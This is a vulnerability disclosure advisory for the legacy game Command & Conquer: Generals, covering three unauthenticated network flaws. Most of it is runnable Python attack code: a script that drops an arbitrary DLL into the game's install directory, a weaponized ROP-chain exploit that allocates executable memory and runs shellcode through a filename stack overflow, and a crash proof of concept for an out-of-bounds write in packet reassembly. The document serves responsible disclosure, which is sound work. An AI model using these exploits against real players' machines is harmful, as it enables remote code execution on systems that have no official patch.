# Command & Conquer: Generals Multiple Vulnerabilities

## Vendors

* Electronic Arts

## Affected Products

Command & Conquer: Generals and Zero Hour v1.05 (latest)

## Summary
Command & Conquer: Generals is vulnerable to multiple vulnerabilities resulting in unauthenticated remote code execution. This could be exploited by attackers on the local network to compromise remote machines. C&C:G is a legacy title with no active support from Electronic Arts and therefore there is no official patch available.

## Remediation/Mitigation
C&C:G is a legacy title with no active support from EA Games and no official servers available. Players should exercise caution when connecting to third party servers for online play and ensure local network play is contained to trusted networks only.

Community supported patching is available and more information can be found here: https://github.com/TheSuperHackers/GeneralsGameCode

## Credit

These issues were found by Bryan Alexander and Jordan Whitehead of Atredis Partners

## References
* https://github.com/electronicarts/CnC_Generals_Zero_Hour
* https://github.com/TheSuperHackers/GeneralsGameCode
* https://legi.cc/genpatcher/

## Report Timeline
2025-08-06: Atredis Partners sent an initial notification to vendor  
2025-08-06: EA Games confirms receipt of the reports  
2025-08-07: EA Games requests additional platform information  
2025-08-11: EA Games validates the three vulnerabilities and assigns two high severity and one medium severity  
2025-08-11: Atredis follows up with additional questions on remediation and disclosure  
2025-08-26: EA Games provides clarifying information on disclosure and patching  

## Technical Details

Three separate vulnerabilities are included in this release. All three issues are remotely accessible and unauthenticated.

### Arbitrary File Write

An arbitrary remote file write vulnerability was discovered in C&C:G that could be exploited to compromise player machines. An attacker does not need to be joined to the game to exploit connected players.

#### Step-by-step details

The `NETCOMMANDTYPE_FILE` net command can be used to send arbitrary files to remote clients. In addition to arbitrary content, the filename is in no way sanitized and can include path traversal characters and extensions. This can be exploited by a remote attacker to drop an arbitrary DLL file onto a victim's machine that loads whenever the game is launched.

To reproduce:
1. Start Command & Conquer: Generals and begin a network game
2. Update the `TARGET_IP` in the below script and execute
3. Observe the 4-byte file `test.dll` located in the root C&C install directory

```python
import struct
import socket
import random

TARGET_IP = "10.0.1.227"
TARGET_PORT = 8088
MAX_PACKET_SIZE = 476

def encrypt_buf(buf):
    out = b""

    mask = 0x0000fade
    c = 0
    for i in range(len(buf) // 4):
        num = struct.unpack("<i", buf[c:c+4])[0]
        num ^= mask
        out += struct.pack(">i", num)
        c += 4
        mask += 0x321

    return out

def gen_crc(buf):
    crc = 0 # 4 byte unsigned value
    for i in range(len(buf)):
        carry = crc & 0x80000000
        crc = (crc << 1) & 0xffffffff
        crc = (crc + buf[i]) & 0xffffffff
        if carry:
            crc = (crc + 1) & 0xffffffff

    return crc

def make_generals_packet(payload, encr=True):
    if len(payload) > MAX_PACKET_SIZE:
        raise RuntimeError(f"Payload is too large. Got {len(payload)} when max is {MAX_PACKET_SIZE}, try wrapping instead.")

    pkt = b""
    pkt += b"\x0d\xf0" # magic
    pkt += payload

    # pad to a multiple of 4
    rem = len(pkt) % 4
    if rem > 0:
        pkt += b"@" * (4 - rem)

    # Now calculate the CRC
    crc = gen_crc(pkt)
    pkt = struct.pack("<I", crc) + pkt

    if encr:
        # encrypt it
        pkt = encrypt_buf(pkt)

    return pkt

def make_file_pkt():
    payload = b""
    # first set command type to NETCOMMANDTYPE_FILEANNOUNCE
    payload += b"T\x12"

    # then do it 
    payload += b"D"
    filename = b"test.dll\x00"
    filedata = b"AAAA"

    payload += filename + len(filedata).to_bytes(4, byteorder="little") + filedata

    return make_generals_packet(payload, encr=True)

def main():
    pkt = make_file_pkt()
    sock = None
    print(f"[!] sending {len(pkt)} byte packet to {TARGET_IP}:{TARGET_PORT}..")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(pkt, (TARGET_IP, TARGET_PORT))
    except Exception as e:
        print(e)
    finally:
        if sock: sock.close()

if __name__ == "__main__":
    main()
```

### Stack-based Buffer Overflow via Filename 
A remote code execution vulnerability was discovered in C&C:G that could be exploited to compromise player machines. An attacker does not need to be joined to the game to exploit connected players.

#### Step-by-step details
When processing a `NETCOMMANDTYPE_FILE` or `NETCOMMANDTYPE_FILEANNOUNCE` net command, the processor will attempt to extract the filename via the following (both handlers exhibit the same vulnerable behavior):

```cpp
NetCommandMsg * NetPacket::readFileMessage(UnsignedByte *data, Int &i) {
	NetFileCommandMsg *msg = newInstance(NetFileCommandMsg);
	char filename[_MAX_PATH];
	char *c = filename;

	while (data[i] != 0) {
		*c = data[i];
		++c;
		++i;
	}
    ...
```
Where `_MAX_PATH` is 260 and `data` is a pointer to the incoming packet, which may exceed 260 but not 476 bytes (`MAX_PACKET_SIZE`). Provided a long filename, we can overflow the `filename` stack buffer and gain control over the instruction pointer:
```
(3d80.b28): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0ccc5974 ebx=1f138298 ecx=41414141 edx=0019f700 esi=0ccad888 edi=ffffffff
eip=44444444 esp=0019f900 ebp=00000013 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210206
44444444 ??              ???
```
Due to a lack of modern security mitigations on several game libraries, such as ASLR, we were able to develop a reliable exploit to gain remote code execution. The following proof of concept can be used to demonstrate arbitrary code execution on the system.

To reproduce:
1. Start Command & Conquer: Generals with Windbg, or similar debugger, attached
2. Begin a network game and start
3. Update the `TARGET_IP` in the below script and execute
4. Observe an interrupt at an executable address with arbitrary code (as example, the provided proof of concept simply interrupts)

```
(16b8.42c8): Break instruction exception - code 80000003 (first chance)
eax=1904875c ebx=22701279 ecx=00000000 edx=190484dc esi=41414141 edi=41414141
eip=16930000 esp=19048694 ebp=16930000 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200206
16930000 cc              int     3
0:000> !address eip

Usage:                  <unknown>
Base Address:           16930000
End Address:            16934000
Region Size:            00004000 (  16.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000040          PAGE_EXECUTE_READWRITE
Type:                   00020000          MEM_PRIVATE
Allocation Base:        16930000
Allocation Protect:     00000040          PAGE_EXECUTE_READWRITE

Content source: 1 (target), length: 4000
```

```python
import struct
import socket
import random

TARGET_IP = "10.0.1.227"
TARGET_PORT = 8088
MAX_MESSAGE_LEN = 1024
MAX_MESSAGES = 128
MAX_PACKET_SIZE = 476

MAX_FRAG_SIZE = MAX_PACKET_SIZE - (24 + 6)

def encrypt_buf(buf):
    out = b""

    mask = 0x0000fade
    c = 0
    for i in range(len(buf) // 4):
        num = struct.unpack("<i", buf[c:c+4])[0]
        num ^= mask
        out += struct.pack(">i", num)
        c += 4
        mask += 0x321

    return out

def gen_crc(buf):
    crc = 0 # 4 byte unsigned value
    for i in range(len(buf)):
        carry = crc & 0x80000000
        crc = (crc << 1) & 0xffffffff
        crc = (crc + buf[i]) & 0xffffffff
        if carry:
            crc = (crc + 1) & 0xffffffff

    return crc

def make_generals_packet(payload, encr=True):
    if len(payload) > MAX_PACKET_SIZE:
        raise RuntimeError(f"Payload is too large. Got {len(payload)} when max is {MAX_PACKET_SIZE}, try wrapping instead.")

    pkt = b""
    pkt += b"\x0d\xf0" # magic
    pkt += payload

    # pad to a multiple of 4
    rem = len(pkt) % 4
    if rem > 0:
        pkt += b"@" * (4 - rem)

    # Now calculate the CRC
    crc = gen_crc(pkt)
    pkt = struct.pack("<I", crc) + pkt

    if encr:
        # encrypt it
        pkt = encrypt_buf(pkt)

    return pkt

def make_wrapped_generals_packets(payload, encr=True):
    # divide into chunks that are small enough
    cmdid = random.randrange(0xffff)

    chunks = []
    for i in range(0, len(payload), MAX_FRAG_SIZE):
        chunks.append(payload[i:i+MAX_FRAG_SIZE])

    frags = []
    offset = 0
    for ci in range(len(chunks)):
        frag = b""
        frag += b'T\x11'
        frag += b"C" + struct.pack("<H", cmdid)
        # if so, update the MAX_FRAG_SIZE
        frag += b'D'

        frag += struct.pack("<H", cmdid)
        frag += struct.pack("<I", ci)
        frag += struct.pack("<I", len(chunks))
        frag += struct.pack("<I", len(payload))
        frag += struct.pack("<I", len(chunks[ci]))
        frag += struct.pack("<I", offset)

        frag += chunks[ci]

        offset += len(chunks[ci])
        frags.append(frag)
    
    return [make_generals_packet(frag, encr) for frag in frags]

def dw(addr):
    return struct.pack("<I", addr)

VIRTUALALLOC_PTR = dw(0x2113e11c)

# mss32.dll.txt:10612:0x21134c40 : mov eax, dword ptr [eax] ; ret
G_MOV_EAX_PTREAX = dw(0x21134c40)
# mss32.dll.txt:10130:0x211331dd : mov dword ptr [ecx], eax ; ret
G_MOV_PTRECX_EAX = dw(0x211331dd)
# mss32.dll.txt:10832:0x21131ffd : mov eax, edx ; ret
G_MOV_EAX_EDX = dw(0x21131ffd)
# mss32.dll.txt:12349:0x211311f8 : pop eax ; ret
G_POP_EAX = dw(0x211311f8)
# mss32.dll.txt:8623:0x211199c4 : jmp eax
G_JMP_EAX = dw(0x211199c4)
# mssrsx.m3d.txt:11138:0x2271fcbf : mov eax, ebx ; pop ebx ; ret
G_MOV_EAX_EBX_POP_EBX = dw(0x2271fcbf)
# mssrsx.m3d.txt:11175:0x22719a92 : mov eax, edi ; pop edi ; ret
G_MOV_EAX_EDI_POP_EDI = dw(0x22719a92)
# mss32.dll.txt:2933:0x211243d3 : add eax, 0x80 ; ret
G_ADD_EAX_80 = dw(0x211243d3)
# mss32.dll.txt:12603:0x211022d2 : pop ebx ; ret
G_POP_EBX = dw(0x211022d2)
# mss32.dll.txt:12713:0x21113061 : pop ecx ; ret
G_POP_ECX = dw(0x21113061)
# mss32.dll.txt:12965:0x2112f347 : pop edx ; ret
G_POP_EDX = dw(0x2112f347)
# mss32.dll.txt:16272:0x2113873a : xchg esp, eax ; ret
G_XCHG_ESP_EAX = dw(0x2113873a)
# mssrsx.m3d.txt:14137:0x22701276 : push eax ; call ebx
G_PUSH_EAX_CALL_EBX = dw(0x22701276)
# mss32.dll.txt:12449:0x2111775f : pop ebp ; pop ebx ; ret
G_POP_EBP_POP_EBX = dw(0x2111775f)
# mss32.dll.txt:12594:0x21136907 : pop ebx ; pop edi ; ret
G_POP_EBX_POP_EDI = dw(0x21136907)
# mss32.dll.txt:12600:0x2111168f : pop ebx ; pop esi ; ret
G_POP_EBX_POP_ESI = dw(0x2111168f)

# mssrsx.m3d.txt:14851:0x22704c7f : rep movsb byte ptr es:[edi], byte ptr [esi] ; pop edi ; pop esi ; ret 8
G_REPMOVSB_POP_EDI_ESI_R8 = dw(0x22704c7f)

# mss32.dll.txt:3099:0x2112ed4e : add edx, ebx ; pop ebx ; ret 0x10
G_ADD_EDX_EBX_POP_EBX_R10 = dw(0x2112ed4e)

# binkw32.dll.txt:8186:0x3000282d : mov ebp, eax ; call ebx
G_MOV_EBP_EAX_CALL_EBX = dw(0x3000282d)
# mss32.dll.txt:4407:0x21110fe4 : call ebp
G_CALL_EBP = dw(0x21110fe4)

#mss32.dll.txt:14615:0x21101058 : ret
G_R = dw(0x21101058)
# mss32.dll.txt:3157:0x2112dba3 : add esp, 0x104 ; ret
G_ADD_ESP_104 = dw(0x2112dba3)

EXTRA_RW_SPACE = 0xa89900

def make_rop_file_announce_packet(encrypt=True):
    shellcode = b"\xcc\xcc"
    shellcode_len = len(shellcode)
    offset_to_chain_with_nulls = (0x80 * 3)
    fake_stack_pad_amt = (0x108 * 1)
    offset_to_shellcode = (0x80 * (5 + (fake_stack_pad_amt // 0x80) + 1))

    # chain without nulls allowed
    p = b""

    # find and save reference to the shellcode in the packet 
    # if we are using a wrapper, then edi should have our packet
    # if we are not, then ebx has our packet
    p += G_MOV_EAX_EDI_POP_EDI
    p += b'AAAA' # extra pop

    # pivot stack to the rest of the chain in the packet
    p += G_ADD_EAX_80 * (offset_to_chain_with_nulls // 0x80)

    # we need to skip an item at 10 dwords down
    # since it is modified after our overflow
    p += G_POP_EDX
    p += b'AAAA'
    p += G_POP_EDX
    p += b'AAAA'


    # save packet pointer before pivot
    p += G_POP_EBX
    p += G_POP_EBP_POP_EBX
    p += G_PUSH_EAX_CALL_EBX # push eax on stack, call, pop ret into ebp, pop eax into ebx
    # now ebx saves our packet pointer

    p += G_XCHG_ESP_EAX

    # chain with nulls allowed
    c = b""

    # save a reference to the old stack for later cleanup
    # no regs to use so use extra space in rw seg
    c += G_POP_ECX
    c += dw(EXTRA_RW_SPACE + 0)
    c += G_MOV_PTRECX_EAX

    # get a reference to VirtualAlloc from mss32.dll
    c += G_POP_EAX
    c += VIRTUALALLOC_PTR
    c += G_MOV_EAX_PTREAX

    # call virtualalloc
    c += (G_ADD_ESP_104 + (b"B" * 0x104)) * (fake_stack_pad_amt // 0x108)

    c += G_JMP_EAX
    c += G_R # return
    c += dw(0) # lpAddress = NULL
    c += dw(0x4000) # dwSize
    c += dw(0x1000) # flAllocationType = MEM_COMMIT
    c += dw(0x40) # flProtect = PAGE_EXECUTE_READWRITE

    # move packet pointer to edx
    c += G_POP_EDX
    c += dw(0)
    c += G_ADD_EDX_EBX_POP_EBX_R10
    c += b'AAAA'
    c += G_R
    c += b'AAAA' * 4 # for ret 0x10

    # save allocation for later jump
    c += G_POP_EBX
    c += G_POP_EBX
    c += G_MOV_EBP_EAX_CALL_EBX

    # memcpy shellcode to our allocation
    c += G_POP_ECX
    c += dw(shellcode_len) # popped into ecx

    c += G_POP_EBX
    c += G_POP_EBX_POP_EDI
    c += G_PUSH_EAX_CALL_EBX # edi is now the allocation

    c += G_MOV_EAX_EDX
    # account for earlier offset too
    c += G_ADD_EAX_80 * ((offset_to_shellcode - offset_to_chain_with_nulls) // 0x80)

    c += G_POP_EBX
    c += G_POP_EBX_POP_ESI
    c += G_PUSH_EAX_CALL_EBX # esi is now the packet at the shellcode

    c += G_REPMOVSB_POP_EDI_ESI_R8
    c += b"AAAA" * 2
    c += G_R
    c += b"AAAA" * 2

    # jump to our allocation
    c += G_CALL_EBP

    # put everything together and pad as needed

    payload = b""
    # first set command type to NETCOMMANDTYPE_FILEANNOUNCE
    payload += b"T\x13"
    # then do it 
    payload += b"D"

    if b"\x00" in p:
        raise RuntimeError("Initial ROP chain can't have nulls!")

    # IP should be at filename of len 0x118
    filename = (b"A" * 0x108) + b"BBBBBBBB" + p + b"\x00"
    fileID = b"CC"
    playermask = b"\xff"

    payload += filename + fileID + playermask

    if len(payload) > offset_to_chain_with_nulls:
        raise RuntimeError("Need more room before chain with nulls")
    
    pad = offset_to_chain_with_nulls - len(payload)
    payload += b"@" * pad

    payload += c

    if len(payload) > offset_to_shellcode:
        raise RuntimeError("Need more room before shellcode")

    pad = offset_to_shellcode - len(payload)
    payload += b"@" * pad

    payload += shellcode

    return make_wrapped_generals_packets(payload, encrypt)

def main():
    pkts = make_rop_file_announce_packet()
    sock = None
    print(f"[!] sending {len(pkts)} packets to {TARGET_IP}:{TARGET_PORT}..")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for p in pkts:
            sock.sendto(p, (TARGET_IP, TARGET_PORT))
    except Exception as e:
        print(e)
    finally:
        if sock: sock.close()

if __name__ == "__main__":
    main()
```

### Stack-based Buffer Overflow via Packet Fragmentation
A remote memory corruption vulnerability was discovered in C&C:G that could be exploited to compromise player machines. An attacker does not need to be joined to the game to exploit connected players.

#### Step-by-step details
A memory corruption vulnerability exists while processing wrapped command messages. The `NETCOMMANDTYPE_WRAPPER` net packet is used to support chunking of large payloads and reassembling them appropriately. The reassembly process is managed by `NetCommandWrapperList` which manages the underlying buffer, its total size, command ID, and generally manages the lifetime of the chunked transmission.

When a new chunk arrives, its data is copied into the underlying `NetCommandWrapperList`. To do this, an offset and size is extracted from the received packet and copied into the buffer:

```cpp
	m_chunksPresent[msg->getChunkNumber()] = TRUE;
	UnsignedInt offset = msg->getDataOffset();
	memcpy(m_data + offset, msg->getData(), msg->getDataLength());
	++m_numChunksPresent;
```
There is no bounds checking on the offset or the size of the packet, both of which are unsigned integers, which causes an arbitrary out of bounds write:
```cpp
(1d38.1a24): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00400000 ebx=1b4cdf8c ecx=000b51c4 edx=00400000 esi=1bdcd91c edi=03bc6000
eip=00717426 esp=0019f8e0 ebp=00000000 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210202
RTS+0x317426:
00717426 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
```

To reproduce:
1. Start Command & Conquer: Generals with Windbg, or similar debugger, attached
2. Begin a network game and start
3. Update the `TARGET_IP` in the below script and execute
4. Observe a crash 

Note that while we did not create a weaponized exploit for this specific issue, due to the lack of mitigations on product binaries and the nature of the crash we are very confident in its exploitability. 

```python
import struct
import socket
import random

TARGET_IP = "10.0.1.227"
TARGET_PORT = 8088
MAX_MESSAGE_LEN = 1024
MAX_MESSAGES = 128
MAX_PACKET_SIZE = 476

MAX_FRAG_SIZE = MAX_PACKET_SIZE - (24 + 6)

def encrypt_buf(buf):
    out = b""

    mask = 0x0000fade
    c = 0
    for i in range(len(buf) // 4):
        num = struct.unpack("<i", buf[c:c+4])[0]
        num ^= mask
        out += struct.pack(">i", num)
        c += 4
        mask += 0x321

    return out

def gen_crc(buf):
    crc = 0 # 4 byte unsigned value
    for i in range(len(buf)):
        carry = crc & 0x80000000
        crc = (crc << 1) & 0xffffffff
        crc = (crc + buf[i]) & 0xffffffff
        if carry:
            crc = (crc + 1) & 0xffffffff

    return crc

def make_generals_packet(payload, encr=True):
    if len(payload) > MAX_PACKET_SIZE:
        raise RuntimeError(f"Payload is too large. Got {len(payload)} when max is {MAX_PACKET_SIZE}, try wrapping instead.")

    pkt = b""
    pkt += b"\x0d\xf0" # magic
    pkt += payload

    # pad to a multiple of 4
    rem = len(pkt) % 4
    if rem > 0:
        pkt += b"@" * (4 - rem)

    # Now calculate the CRC
    crc = gen_crc(pkt)
    pkt = struct.pack("<I", crc) + pkt

    if encr:
        # encrypt it
        pkt = encrypt_buf(pkt)

    return pkt

def make_wrapped_generals_packets(payload, encr=True):
    # divide into chunks that are small enough
    cmdid = random.randrange(0xffff)

    chunks = []
    for i in range(0, len(payload), MAX_FRAG_SIZE):
        chunks.append(payload[i:i+MAX_FRAG_SIZE])

    frags = []
    offset = 0
    for ci in range(len(chunks)):
        frag = b""
        frag += b'T\x11'
        frag += b"C" + struct.pack("<H", cmdid)
        # if so, update the MAX_FRAG_SIZE
        frag += b'D'

        frag += struct.pack("<H", cmdid)
        frag += struct.pack("<I", ci)
        frag += struct.pack("<I", len(chunks))
        frag += struct.pack("<I", len(payload))
        frag += struct.pack("<I", 0x400000) # crashing data length
        frag += struct.pack("<I", offset)

        frag += chunks[ci]

        offset += len(chunks[ci])
        frags.append(frag)
    
    return [make_generals_packet(frag, encr) for frag in frags]

def main():
    pkts = make_wrapped_generals_packets(b"A")
    print(f"[!] sending {len(pkts)} packets to {TARGET_IP}:{TARGET_PORT}..")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for p in pkts:
            sock.sendto(p, (TARGET_IP, TARGET_PORT))
    except Exception as e:
        print(e)
    finally:
        if sock: sock.close()

if __name__ == "__main__":
    main()
```
